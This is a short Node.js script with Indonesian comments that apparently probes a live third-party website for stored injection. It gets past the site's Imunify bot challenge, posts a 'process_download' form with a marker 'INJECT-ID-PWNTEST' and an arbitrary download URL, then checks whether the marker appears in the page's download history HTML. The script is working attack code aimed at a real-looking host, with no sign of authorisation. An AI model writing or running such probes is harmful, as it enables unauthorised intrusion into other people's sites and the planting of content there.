import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const MARK = process.argv[3] || 'INJECT-ID-PWNTEST';
const TITLE = process.argv[4] || MARK;
const URL_ = process.argv[5] || 'https://sfile.co/VCa4EJPMs7J';

const TARGET = '/config/index.php?page=1';
// 1) bersihkan challenge untuk URL target persis (clearance Imunify per-URL)
await c.get(TARGET);
const post = async (body) => c.get(TARGET, {
  method: 'POST', body,
  headers: { 'content-type': 'application/x-www-form-urlencoded', accept: 'application/json, text/plain, */*', origin: 'https://tutorialinjectid.my.id', referer: 'https://tutorialinjectid.my.id/config/' },
});

const form = new URLSearchParams({ action: 'process_download', config_url: URL_, config_title: TITLE }).toString();
const r = await post(form);
console.log('[POST] status', r.status, 'ct', r.ct, 'len', r.body.length);
console.log('[RESPONSE]', r.body.slice(0, 900));

const g = await c.get('/config/');
fs.writeFileSync('/tmp/opencode/config_after.html', g.body);
console.log('\n[GET /config/] status', g.status, 'len', g.body.length);
const i = g.body.indexOf(MARK.slice(0, 8));
console.log('[HISTORY] marker ditemukan?', i > 0);
if (i > 0) {
  console.log('[RAW HTML SEKITAR MARKER]');
  console.log(g.body.slice(Math.max(0, i - 400), i + 400));
}
const hist = g.body.match(/Live Download History[\s\S]{0,4000}/);
if (hist) console.log('\n[ ISI HISTORY RAW ]\n' + hist[0].replace(/\s+/g, ' ').slice(0, 1600));
